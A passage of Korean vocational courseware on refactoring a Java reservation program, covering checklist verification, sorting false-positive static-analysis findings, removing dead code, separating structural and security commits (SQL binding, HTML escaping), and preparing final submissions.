+지적 5건
+
+&gt; python 보안약점.py step2\src
+지적 2건
+
+&gt; python 복잡도.py step2\src
+메서드 20개 · 가장 긴 것 19줄 · 최대 복잡도 6
+
+&gt; git log --oneline
+b2c1d09 보안 조치 — SQL 바인딩 · HTML 이스케이프 (출력 5줄 변경)
+a71f3e4 구조 개선 — 메서드 추출 · 이동 · 임시 변수 정리 (기능 동일)
+3f9a2c1 리팩토링 전 — 고칠 코드와 실행 결과</code></p>
+
+  <h5>절차 2 — 판정표를 채운다</h5>
+
+  <p class="cmdline"><code>분석\체크리스트결과.md
+
+| 번호 | 확인할 것 | 통과 조건 | 결과 | 판정 |
+|------|-----------|-----------|------|------|
+| 1 | 기능이 그대로인가 | 다른 줄 0개 | 0개 (구조 개선 구간) | 통과 |
+| 2 | 컴파일되는가 | 오류 0 | 오류 0 | 통과 |
+| 3 | 개발 표준을 지키는가 | 지적 0건 | 1건 (101자) | 미달 |
+| 4 | 죽은 코드가 없는가 | 진짜 지적 0건 | 진짜 2건 | 미달 |
+| 5 | 보안 약점이 없는가 | 진짜 지적 0건 | 진짜 0건 (오탐 2건) | 통과 |
+| 6 | 복잡도가 목표 안인가 | 10 이하 | 6 | 통과 |
+| 7 | 메서드가 짧은가 | 30줄 이하 | 19줄 | 통과 |
+| 8 | 커밋이 나뉘어 있는가 | 구조와 보안이 따로 | 커밋 3개 | 통과 |</code></p>
+
+  <p>여섯이 통과이고 둘이 미달입니다.</p>
+
+  <h5>절차 3 — 죽은 코드 다섯 줄을 가른다</h5>
+
+  <table class="wide">
+    <tr><th style="width:190px">지적</th><th style="width:90px">진짜인가</th><th>까닭</th></tr>
+    <tr><td>Html.java:12</td><td>오탐</td>
+        <td><code>return</code> 문이 다섯 줄에 걸쳐 있는데 둘째 줄을 따로 본 것입니다</td></tr>
+    <tr><td>ReservationConsole:32</td><td>오탐</td>
+        <td>같은 까닭입니다</td></tr>
+    <tr><td>ReservationSql:17 text</td><td>진짜</td>
+        <td>만들어 놓고 아무 데서도 안 부릅니다</td></tr>
+    <tr><td>ReservationSql:21 values</td><td>진짜</td>
+        <td>같습니다</td></tr>
+    <tr><td>ReservationSql:26 toString</td><td>오탐</td>
+        <td>문자열과 이어 붙일 때 자바가 자동으로 부릅니다</td></tr>
+  </table>
+
+  <p>다섯 가운데 둘이 진짜입니다. 나머지 셋은 도구 쪽 문제입니다.</p>
+
+  <h5>절차 4 — 오탐인지 직접 확인한다</h5>
+
+  <p class="cmdline"><code>toString 이 정말 불리는지 봅니다
+
+&gt; powershell -c "Select-String step2\src\ReservationConsole.java -Pattern 'sql' -SimpleMatch"
+...
+step2\src\ReservationConsole.java:38:        System.out.println("[SQL] " + sql);
+
+문자열과 + 로 이어 붙이면 자바가 toString 을 부릅니다
+지우면 화면에 객체 주소가 찍힙니다</code></p>
+
+  <p>지워 보면 바로 압니다.
+     실제로 지우고 돌리면 <code>[SQL] ReservationSql@53d8d10a</code> 처럼 찍힙니다.
+     확인했으면 되돌리십시오.</p>
+
+  <h5>절차 5 — 진짜 둘을 지운다</h5>
+
+  <p class="cmdline"><code>ReservationSql 에서 지우는 것
+
+    public String text() { return INSERT; }
+    public List&lt;String&gt; values() { return values; }
+
+&gt; javac -encoding utf-8 -proc:none -d step2\classes step2\src\*.java
+(오류 없음)
+
+&gt; python 회귀테스트.py step1\classes step2\classes
+줄 15개 · 다른 줄 5개
+
+&gt; python 죽은코드.py step2\src
+Html.java                  12  닿을 수 없는 줄   .replace("&lt;", "&amp;lt;")
+ReservationConsole.java    33  닿을 수 없는 줄   .bind(member)
+ReservationSql.java        18  안 쓰는 메서드    toString
+지적 3건  — 셋 다 오탐</code></p>
+
+  <div class="warn">실습 12 에서 나중에 쓸 것 같아 미리 만들어 둔 둘입니다.
+    죽은 코드를 없애려고 시작한 작업에서 죽은 코드를 새로 만든 셈입니다.
+    데이터베이스에 연결할 때가 오면 그때 만들어도 늦지 않습니다.
+    <b>지금 안 쓰는 것은 만들지 않는 편이 낫습니다.</b>
+  </div>
+
+  <h5>절차 6 — 긴 줄을 나눈다</h5>
+
+  <p class="cmdline"><code>앞 (101자)
+    private static ReservationSql buildSql(String member, String facility, String day, String time) {
+
+뒤
+    private static ReservationSql buildSql(String member, String facility,
+                                           String day, String time) {
+
+&gt; python 표준검사.py step2\src
+--------------------------------------------------------------------------
+지적 0건</code></p>
+
+  <p>줄이 길어진 근본 원인은 인자가 넷이라는 것입니다.
+     인자를 객체 하나로 묶으면 짧아지지만 이번에는 안 합니다.</p>
+
+  <h5>절차 7 — 나눈 뒤에 도구가 잘 세는지 확인한다</h5>
+
+  <p class="cmdline"><code>&gt; python 복잡도.py step2\src
+...
+ReservationConsole.java   buildSql            7       1
+...
+메서드 18개 · 가장 긴 것 19줄 · 최대 복잡도 6</code></p>
+
+  <p>메서드가 스물에서 열여덟이 되었습니다. 지운 둘만큼 줄었고 <code>buildSql</code> 은 그대로 세어집니다.
+     실습 5 에서 머리를 네 줄까지 내다보게 만들어 둔 덕입니다.
+     그 대비가 없었다면 지금 <code>buildSql</code> 이 목록에서 사라졌을 것입니다.</p>
+
+  <h5>절차 8 — 안 고치기로 한 것을 적는다</h5>
+
+  <p class="cmdline"><code>분석\다음차례.md 에 이어서 적습니다
+
+| 무엇 | 왜 지금 안 하나 | 언제 |
+|------|-----------------|------|
+| 정원 검사가 안 도는 문제 | 결함 조치라 회귀 시험과 섞임 | 다음 차례 |
+| 날짜 일자 검사 추가 | 기능 추가라 이번 범위가 아님 | 다음 차례 |
+| 인자 넷을 객체로 묶기 | 이번 목표에 없음 | 기능을 더할 때 같이 |
+| 메모리 목록을 DB 로 | 연결 대상이 없음 | SQL 응용 교과 |
+| 도구를 구문 해석 방식으로 | 정규식 한계가 뚜렷함 | 여력이 있을 때 |
+| JUnit 도입 | 시험 틀이 따로 필요함 | 테스트 교과 |</code></p>
+
+  <p>여섯 줄 가운데 앞의 둘은 실습 3 에서 적어 둔 것입니다.
+     리팩토링을 하다 보면 고칠 거리가 계속 눈에 들어오는데, 목록이 있으면 흔들리지 않습니다.</p>
+
+  <h5>절차 9 — 판정표를 다시 채운다</h5>
+
+  <p class="cmdline"><code>분석\체크리스트결과.md — 조치 뒤
+
+| 번호 | 결과 | 판정 |
+|------|------|------|
+| 1 | 0개 (구조 개선 구간) · 5개 (보안 조치 구간, 전부 설명됨) | 통과 |
+| 2 | 오류 0 | 통과 |
+| 3 | 지적 0건 | 통과 |
+| 4 | 진짜 지적 0건 (오탐 3건) | 통과 |
+| 5 | 진짜 지적 0건 (오탐 2건) | 통과 |
+| 6 | 6 | 통과 |
+| 7 | 19줄 | 통과 |
+| 8 | 커밋 3개 | 통과 |
+
+여덟 줄 다 통과</code></p>
+
+  <h5>절차 10 — 처음과 끝을 나란히 놓는다</h5>
+
+  <p class="cmdline"><code>분석\최종결과.md
+
+| 지표 | before | step2 | 목표 | 판정 |
+|------|--------|-------|------|------|
+| 최대 순환 복잡도 | 19 | 6 | 10 이하 | 달성 |
+| 가장 긴 메서드 | 64줄 | 19줄 | 30줄 이하 | 달성 |
+| 표준 검사 지적 | 5건 | 0건 | 0건 | 달성 |
+| 죽은 코드 (진짜) | 3건 | 0건 | 0건 | 달성 |
+| 보안 약점 (진짜) | 6건 | 0건 | 0건 | 달성 |
+| 파일 수 | 1 | 5 | - | - |
+| 줄 수 | 103 | 166 | - | - |
+| 메서드 수 | 6 | 18 | - | - |</code></p>
+
+  <p>보안 약점을 여섯으로 적은 것을 눈여겨보십시오.
+     도구가 찾은 다섯에 사람이 찾은 한 줄을 더한 값입니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>오탐을 0건으로 만들고 싶다</td>
+        <td>만들지 마십시오. 코드가 이상해집니다</td></tr>
+    <tr><td><code>toString</code> 을 지웠더니 주소가 찍힌다</td>
+        <td>오탐이라는 증거입니다. 되돌리십시오</td></tr>
+    <tr><td>줄을 나눴더니 메서드가 안 세어진다</td>
+        <td>실습 5 의 <code>머리</code> 함수를 안 넣은 것입니다</td></tr>
+    <tr><td>미달을 그냥 두면 안 되나</td>
+        <td>됩니다. 대신 왜 두는지를 적으십시오</td></tr>
+    <tr><td>줄 수가 166 이 아니다</td>
+        <td>지운 메서드 수가 다른 것입니다. 숫자보다 판정이 중요합니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — 여덟 줄을 돌린 화면, <code>체크리스트결과.md</code>(조치 전과 후),
+     죽은 코드를 가른 표, 오탐을 확인한 기록,
+     지우고 나눈 뒤의 도구 화면, <code>다음차례.md</code>, <code>최종결과.md</code></p>
+
+  <p><b>스스로 확인</b> —
+     ① 여덟 줄을 하나씩 판정했습니까
+     ② 오탐과 진짜를 갈랐습니까
+     ③ 진짜 지적을 조치했습니까
+     ④ 안 고치기로 한 것과 까닭을 적었습니까</p>
+</div>
+      </div>
+</div>
+
+<h3 class="lv">레벨 6 · 마무리 <span>다섯 줄을 세고 냅니다</span></h3>
+
+<div class="step" id="st16">
+      <h3><i>16</i>자가 점검과 제출</h3>
+      <aside class="side">
+        <p class="pt">바뀐 줄을 설명할 수 있어야 끝입니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 평가</p>
+        <b class="sh">내는 것</b>
+        <p class="v">기준서 · 분석 결과서 · 고친 소스 · 시험 결과서</p>
+      </aside>
+      <div class="bd">
+
+<h4>능력단위요소 셋을 셉니다</h4>
+
+<table class="wide">
+  <tr><th style="width:56px">요소</th><th style="width:270px">할 수 있어야 하는 것</th><th>근거</th></tr>
+  <tr><td class="c">①</td><td>품질 목표를 숫자로 세운다</td><td>실습 5 품질목표.md</td></tr>
+  <tr><td class="c">①</td><td>완전성을 확인할 체크리스트를 만든다</td><td>실습 5 체크리스트.md</td></tr>
+  <tr><td class="c">①</td><td>쓸 도구와 절차를 정한다</td><td>실습 5 절차.md</td></tr>
+  <tr><td class="c">②</td><td>개발 표준을 안 지킨 자리를 찾는다</td><td>실습 6 표준위반.md</td></tr>
+  <tr><td class="c">②</td><td>불필요한 코드를 찾는다</td><td>실습 7 죽은코드 결과</td></tr>
+  <tr><td class="c">②</td><td>잠재 결함을 찾는다</td><td>실습 8 보안약점.md</td></tr>
+  <tr><td class="c">③</td><td>구조를 개선한다</td><td>실습 9 ~ 11 step1</td></tr>
+  <tr><td class="c">③</td><td>초기 기능이 유지되는지 확인한다</td><td>실습 14 회귀시험결과.md</td></tr>
+  <tr><td class="c">③</td><td>체크리스트를 만족하는지 검토한다</td><td>실습 15 체크리스트결과.md</td></tr>
+</table>
+
+<h4>제출 전에 볼 다섯</h4>
+
+<p class="cmdline"><code>① 구조 개선 구간의 회귀 시험이 0개인가
+② 보안 조치 구간의 바뀐 줄을 한 줄씩 설명했는가
+③ 도구 지적을 진짜와 오탐으로 갈랐는가
+④ 커밋이 구조와 보안으로 나뉘어 있는가
+⑤ 안 고치기로 한 것을 적어 두었는가</code></p>
+
+<p>②가 이 교과에만 있는 항목입니다.
+   나머지 넷은 절차를 지켰느냐는 물음이고, ②는 자기가 무엇을 바꿨는지 아느냐는 물음입니다.</p>
+
+<h4>마지막으로 다 돌려 봅니다</h4>
+
+<p class="cmdline"><code>&gt; python 회귀테스트.py before\classes step1\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 회귀테스트.py step1\classes step2\classes
+줄 15개 · 다른 줄 5개
+
+&gt; python 복잡도.py step2\src
+메서드 18개 · 가장 긴 것 19줄 · 최대 복잡도 6
+
+&gt; python 표준검사.py step2\src
+지적 0건</code></p>
+
+<p>실습 15 에서 안 쓰는 메서드 둘을 지우고 긴 줄을 나눴으므로
+   메서드 수가 20 에서 18 로 줄고 표준 지적이 0건이 됩니다.</p>
+
+<h4>커밋 둘을 확인합니다</h4>
+
+<p class="cmdline"><code>&gt; git log --oneline
+b2c1d09 보안 조치 — SQL 바인딩 · HTML 이스케이프 (출력 5줄 변경)
+a71f3e4 구조 개선 — 메서드 추출 · 이동 · 임시 변수 정리 (기능 동일)</code></p>
+
+<p>두 줄이 이 교과의 결과물을 가장 짧게 요약한 것입니다.
+   위 커밋을 되돌리면 보안만 되돌아가고 구조 개선은 남습니다.</p>
+
+<h4>파일을 모읍니다</h4>
+
+<p class="cmdline"><code>리팩토링/
+  before/    src · classes
+  step1a/    메서드 추출
+  step1b/    메서드 이동
+  step1/     임시 변수 정리 — 순수 리팩토링 완료
+  step2/     보안 조치
+  도구/      표준검사.py · 죽은코드.py · 보안약점.py
+             복잡도.py · 회귀테스트.py
+  분석/      깨끗한코드기준.md · 품질목표.md · 체크리스트.md · 절차.md
+             표준위반.md · 보안약점.md
+             회귀시험결과.md · 체크리스트결과.md · 다음차례.md
+  화면/      01_표준검사_before.png · 02_죽은코드_before.png
+             03_보안약점_before.png · 04_회귀_구조개선.png
+             05_회귀_보안조치.png
+  제출목록.md</code></p>
+
+<p>화면 다섯 가운데 05 가 다른 줄 다섯 개가 찍힌 화면입니다. 0개짜리 화면만 내면 보안 조치를 안 한 것처럼 보입니다.</p>
+
+<h4>뒤에서 다시 나오는 자리</h4>
+
+<table class="wide">
+  <tr><th style="width:250px">여기서 배운 것</th><th>다시 만나는 곳</th></tr>
+  <tr><td>SQL 바인딩</td><td>SQL 응용의 PreparedStatement</td></tr>
+  <tr><td>이스케이프</td><td>화면 구현의 출력 처리</td></tr>
+  <tr><td>회귀 테스트</td><td>애플리케이션 테스트 수행</td></tr>
+  <tr><td>체크리스트</td><td>정보시스템 이행의 인수 점검표</td></tr>
+  <tr><td>커밋 나누기</td><td>실무 프로젝트의 형상관리</td></tr>
+</table>
+
+<p>리팩토링은 이 교과에서 끝나는 일이 아닙니다.
+   남은 교과에서 코드를 쓸 때마다 여기서 만든 도구를 다시 돌려 보십시오.
+   새로 쓴 코드가 목표 안에 들어오는지 보는 데 몇 초면 됩니다.</p>
+      <div class="lab">
+  <b class="t">실습 16</b>
+  <b>다섯 줄로 점검하고 낸다</b>
+
+  <p><b>목적</b> — 이 교과의 제출물은 코드와 문서가 섞여 있어서 빠진 것이 잘 안 보입니다.
+     다섯 줄로 훑고, 도구를 마지막으로 한 번 더 돌린 다음에 냅니다.</p>
+
+  <h5>절차 1 — 다섯 줄로 훑는다</h5>
+
+  <p class="cmdline"><code>① 구조 개선 구간의 회귀 시험이 0개인가
+② 보안 조치 구간의 바뀐 줄을 한 줄씩 설명했는가
+③ 도구 지적을 진짜와 오탐으로 갈랐는가
+④ 커밋이 구조와 보안으로 나뉘어 있는가
+⑤ 안 고치기로 한 것을 적어 두었는가</code></p>
+
+  <p>②가 이 교과에만 있는 항목입니다.
+     앞뒤의 넷은 시킨 대로 했는지를 묻지만 ②는 스스로 무엇을 바꿨는지 아는지를 묻습니다.</p>
+
+  <h5>절차 2 — 마지막으로 다 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 회귀테스트.py before\classes step1\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 회귀테스트.py step1\classes step2\classes
+줄 15개 · 다른 줄 5개
+■ 바뀐 줄이 5개 — 의도한 것인지 확인하십시오
+
+&gt; python 복잡도.py step2\src
+메서드 18개 · 가장 긴 것 19줄 · 최대 복잡도 6
+
+&gt; python 표준검사.py step2\src
+지적 0건
+
+&gt; python 죽은코드.py step2\src
+지적 3건  — 셋 다 오탐
+
+&gt; python 보안약점.py step2\src
+지적 2건  — 둘 다 오탐</code></p>
+
+  <p>여섯 명령이 이 교과의 결과를 한 화면에 보여 줍니다.</p>
+
+  <h5>절차 3 — 능력단위요소 셋을 대 본다</h5>
+
+  <p class="cmdline"><code>| 요소 | 할 수 있어야 하는 것 | 내 파일 |
+|------|----------------------|---------|
+| ① | 품질 목표를 숫자로 세운다 | 품질목표.md |
+| ① | 완전성을 확인할 체크리스트를 만든다 | 체크리스트.md |
+| ① | 쓸 도구와 절차를 정한다 | 절차.md · 도구 5개 |
+| ② | 개발 표준을 안 지킨 자리를 찾는다 | 표준위반.md |
+| ② | 불필요한 코드를 찾는다 | 죽은코드_한계.md |
+| ② | 잠재 결함을 찾는다 | 보안약점.md |
+| ③ | 구조를 개선한다 | step1a · step1b · step1 |
+| ③ | 초기 기능이 유지되는지 확인한다 | 회귀시험결과.md |
+| ③ | 체크리스트를 만족하는지 검토한다 | 체크리스트결과.md |</code></p>
+
+  <p>오른쪽 칸이 비면 그 실습을 안 한 것입니다.</p>
+
+  <h5>절차 4 — 커밋 셋을 확인한다</h5>
+
+  <p class="cmdline"><code>&gt; git log --oneline
+b2c1d09 보안 조치 — SQL 바인딩 · HTML 이스케이프 (출력 5줄 변경)
+a71f3e4 구조 개선 — 메서드 추출 · 이동 · 임시 변수 정리 (기능 동일)
+3f9a2c1 리팩토링 전 — 고칠 코드와 실행 결과</code></p>
+
+  <h5>절차 5 — 되돌리기가 되는지 확인한다</h5>
+
+  <p class="cmdline"><code>&gt; git revert --no-commit b2c1d09
+&gt; javac -encoding utf-8 -proc:none -d step2\classes step2\src\*.java
+&gt; python 회귀테스트.py step1\classes step2\classes
+줄 15개 · 다른 줄 0개
+
+보안 조치만 되돌아가고 구조 개선은 남았습니다
+
+&gt; git revert --abort</code></p>
+
+  <p>커밋을 나눠 둔 덕에 보안 조치만 뺄 수 있습니다.
+     둘을 한 커밋에 넣었다면 되돌릴 때 메서드 쪼갠 것까지 같이 딸려 나옵니다.
+     실습 3 에서 끊을 자리를 미리 정한 값이 여기서 드러납니다.</p>
+
+  <h5>절차 6 — 파일을 모은다</h5>
+
+  <p class="cmdline"><code>리팩토링/
+  before/    src · classes · 출력.txt
+  step1a/    메서드 추출
+  step1b/    메서드 이동
+  step1/     임시 변수 정리 — 구조 개선 완료
+  step2/     보안 조치
+  도구/      복잡도.py · 표준검사.py · 죽은코드.py
+             보안약점.py · 회귀테스트.py
+  분석/      깨끗한코드기준.md · 이름표.md
+             품질목표.md · 체크리스트.md · 절차.md
+             표준위반.md · 죽은코드_한계.md · 보안약점.md
+             고칠거리.md · 구조개선결과.md
+             회귀시험결과.md · 시험한계.md
+             체크리스트결과.md · 다음차례.md · 최종결과.md
+  화면/      01_표준검사_before.png · 02_죽은코드_before.png
+             03_보안약점_before.png
+             04_회귀_구조개선.png · 05_회귀_보안조치.png
+  제출목록.md</code></p>
+
+  <p>다섯 장 가운데 05 에만 「다름」이 찍혀 있습니다.
+     통과 화면만 골라 내면 실습 12 와 13 을 건너뛴 것처럼 읽힙니다.</p>
+
+  <h5>절차 7 — 제출목록의 상태 칸을 채운다</h5>
+
+  <p class="cmdline"><code>리팩토링\제출목록.md
+
+| 폴더 | 파일 | 만드는 실습 | 상태 |
+|------|------|-------------|------|
+| 분석 | 깨끗한코드기준.md | 4 | 완료 |
+| 분석 | 품질목표.md | 5 | 완료 |
+| 도구 | 복잡도.py | 5 | 완료 |
+...
+
+열여덟 줄이 다 «완료» 면 낼 수 있습니다</code></p>
+
+  <h5>절차 8 — 처음과 끝을 한 줄로 요약한다</h5>
+
+  <p class="cmdline"><code>한 파일 103줄 process 복잡도 19
+  ↓
+다섯 파일 166줄 최대 복잡도 6
+화면 출력 15줄 가운데 5줄이 바뀌었고 다섯 줄 다 설명됨</code></p>
+
+  <div class="note">이 한 줄이 리팩토링 보고의 뼈대입니다.
+    무엇이 얼마나 나아졌는지와, 겉으로 무엇이 달라졌는지를 함께 말해야 합니다.
+    앞만 말하면 「고쳐서 좋아졌다」는 주장이 되고, 뒤만 말하면 「건드려서 바뀌었다」는 보고가 됩니다.
+    둘을 나란히 놓아야 판단할 수 있는 보고가 됩니다.
+  </div>
+
+  <h5>절차 9 — 다음 교과에서 다시 만날 것을 적어 둔다</h5>
+
+  <p class="cmdline"><code>SQL 바인딩    →  SQL 응용의 PreparedStatement
+이스케이프     →  화면 구현의 출력 처리
+회귀 테스트    →  애플리케이션 테스트 수행
+체크리스트     →  정보시스템 이행의 인수 점검표
+커밋 나누기    →  실무 프로젝트의 형상관리</code></p>
+
+  <p>도구 다섯은 이 교과가 끝나도 그대로 쓸 수 있습니다.
+     다음 교과에서 자바 파일을 쓰고 나면 경로만 바꿔 돌려 보십시오.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>구조 개선 구간이 0개가 아니다</td>
+        <td>실습 9 ~ 11 을 한 단계씩 되짚으십시오</td></tr>
+    <tr><td>보안 조치 구간이 5개가 아니다</td>
+        <td>실습 13 에서 시험용 호출을 안 되돌렸는지 보십시오</td></tr>
+    <tr><td><code>git revert</code> 가 막힌다</td>
+        <td>고친 파일이 남아 있으면 먼저 정리하십시오</td></tr>
+    <tr><td>화면 05 를 안 찍었다</td>
+        <td>실습 14 절차 4 를 다시 돌려 찍으십시오</td></tr>
+    <tr><td>제출 형식을 모르겠다</td>
+        <td>작업지시서에 적혀 있습니다. 수업 시간에 받으십시오</td></tr>
+  </table>
+
+  <p><b>제출물</b> — 다섯 줄 점검 결과, 도구 여섯을 돌린 화면,
+     능력단위요소 대조표, <code>git log</code>, 되돌리기 확인 화면,
+     파일 목록, <code>제출목록.md</code>(상태 채운 것), 한 줄 요약</p>
+
+  <p><b>스스로 확인</b> —
+     ① 다섯 줄을 하나씩 확인했습니까
+     ② 도구를 다시 돌려 마지막 값을 확인했습니까
+     ③ 커밋 하나만 되돌려 봤습니까
+     ④ 지적이 찍힌 화면도 함께 냅니까</p>
+</div>
+      </div>
+</div>
+<!-- ═══════ 3 ═══════ -->
+<h2 class="sec" id="g3">3. 주요 감점 요인</h2>
+<div class="sect">
+  <aside class="side">
+    <p class="pt">고치기만 하고 증명하지 않습니다.</p>
+    <b class="sh">가장 큰 것</b>
+    <p class="v">회귀 시험이 없음</p>
+    <b class="sh">가장 아까운 것</b>
+    <p class="v">커밋을 안 나눔</p>
+  </aside>
+  <div class="bd">
+
+<table class="wide">
+  <tr><th style="width:44%">자주 나오는 모습</th><th>보완</th></tr>
+  <tr><td>고치기 전 판을 안 남김</td>
+      <td>견줄 대상이 없으면 기능 유지를 증명할 수 없습니다 (실습 2)</td></tr>
+  <tr><td>품질 목표가 「좋게」</td>
+      <td>도구로 판정되는 숫자를 쓰십시오 (실습 5)</td></tr>
+  <tr><td>도구 결과를 그대로 옮겨 적음</td>
+      <td>오탐과 미탐을 갈라야 분석입니다 (실습 7 · 8)</td></tr>
+  <tr><td>줄 수가 줄어야 잘한 것이라 생각</td>
+      <td>103줄이 173줄이 되고 복잡도는 19에서 6이 됩니다 (실습 9 ~ 11)</td></tr>
+  <tr><td>한 번에 다 고침</td>
+      <td>어디서 틀어졌는지 못 찾습니다 (실습 3)</td></tr>
+  <tr><td>구조와 보안을 한 커밋에</td>
+      <td>바뀐 줄이 어느 쪽 탓인지 가릴 수 없습니다 (실습 11 · 13)</td></tr>
+  <tr><td>회귀 시험을 안 돌림</td>
+      <td>망가뜨렸는지 모른 채 냅니다 (실습 14)</td></tr>
+  <tr><td>바뀐 줄을 설명 못 함</td>
+      <td>의도한 것과 사고를 가르지 못합니다 (실습 14)</td></tr>
+</table>
+
+<div class="warn">아래 둘이 이 교과에서 가장 크게 물립니다.
+  회귀 시험 없이 고친 것은 리팩토링이 아니라 그냥 수정이고,
+  구조와 보안을 한 커밋에 넣으면 되돌릴 때 둘이 같이 딸려 나옵니다.
+  <b>기능을 그대로 두었다는 증명과, 바꾼 것을 따로 끊어 둔 기록</b>이 이 교과의 제출물입니다.
+</div>
+  </div>
+</div>
+
+<footer>
+  애플리케이션 리팩토링 · 6수준 · 담당 정우균<br>
+  능력단위요소와 학습 내용·수행 순서는 NCS 학습모듈
+  <code>2001020217_23v6</code> 에서 옮긴 것입니다 —
+  한국직업능력연구원 · 공공누리 제2유형(출처표시 · 상업적 이용 금지).<br>
+  깨끗한 코드의 네 기준은 학습모듈 1-1 을, 보안 약점 갈래는 행정안전부
+  소프트웨어 개발보안 가이드를 따랐습니다.
+  줄 수 · 복잡도 · 회귀 시험 결과는 이 교안을 위해
+  Windows 11 · OpenJDK 21.0.2 · Python 3.12.10 에서 실제로 돌려 얻은 것입니다.
+</footer>
+
+</div>
+
+<script>
+/* 빠른 이동 — 지금 보는 단원을 표시하고, 좁은 화면에서는 여닫습니다. */
+(function () {
+  var nav = document.getElementById('qnav'), btn = document.getElementById('qbtn');
+  var links = [].slice.call(nav.querySelectorAll('a[href^="#st"],a[href="#g3"]'));
+  var tgt = links.map(function (a) { return document.getElementById(a.getAttribute('href').slice(1)); });
+  function mark() {
+    var y = window.scrollY + 120, cur = 0;
+    for (var i = 0; i < tgt.length; i++) if (tgt[i] && tgt[i].offsetTop <= y) cur = i;
+    links.forEach(function (a, i) { a.classList.toggle('on', i === cur); });
+  }
+  window.addEventListener('scroll', mark, { passive: true });
+  mark();
+  btn.addEventListener('click', function () { nav.classList.toggle('open'); });
+  nav.addEventListener('click', function (e) { if (e.target.closest('a')) nav.classList.remove('open'); });
+})();
+</script>
